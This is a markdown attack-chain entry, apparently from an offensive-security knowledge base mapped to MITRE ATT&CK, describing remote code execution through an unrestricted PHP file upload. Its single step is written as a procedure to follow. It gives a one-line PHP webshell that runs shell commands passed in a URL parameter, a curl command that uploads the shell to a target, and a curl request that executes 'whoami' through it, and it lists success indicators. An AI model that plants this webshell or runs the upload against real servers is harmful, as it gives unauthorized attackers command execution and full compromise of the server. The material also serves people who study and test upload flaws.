---
id: ac-php-upload-rce-001
tags:
  - rce
  - php
  - file-upload
  - code-injection
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Upload-Malicious-PHP-File-for-RCE]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:27.308Z'
description: >-
  A critical vulnerability allowing unrestricted file uploads of PHP files,
  leading to arbitrary code execution on the server.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Remote Code Execution via Unrestricted PHP File Upload

Multi-stage attack chain demonstrating a complete attack workflow exploiting a file upload vulnerability to achieve remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via File Upload] --> B[Code Execution]
    B --> C[Arbitrary Command Injection]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web application running on PHP server
- File upload endpoint accessible
- No authentication required for upload (or valid session)

### Initial Access Requirements

- Network access to the web application
- No prior credentials needed if upload is unauthenticated

## Detailed Attack Procedures

### Step 1: Exploit File Upload for RCE
procedure: [[procedures/Upload-Malicious-PHP-File-for-RCE]]

**Objective**: Upload a malicious PHP file to the server and trigger its execution to run arbitrary code.

**Instructions**: Create a simple PHP webshell file, such as `shell.php` with content like `<?php system($_GET['cmd']); ?>`. Then use [[commands/curl-php-upload]] to upload it to the vulnerable endpoint:

```bash
curl -X POST -F "file=@shell.php" http://target.com/upload.php
```

Once uploaded, access the file directly in the browser or via curl to execute code, for example:

```bash
curl "http://target.com/uploads/shell.php?cmd=whoami"
```

**Expected Output**: The uploaded file is stored in an executable directory, and accessing it returns the output of the executed command, such as the server username.

**Success Indicators**:
- File upload succeeds without errors
- Accessing the uploaded PHP file executes the embedded code and returns command output
- Server processes the PHP, confirming RCE

## Attack Chain Summary

### Key Achievements

1. Bypassed file type restrictions to upload executable PHP code
2. Achieved remote code execution on the server
3. Demonstrated potential for full server compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
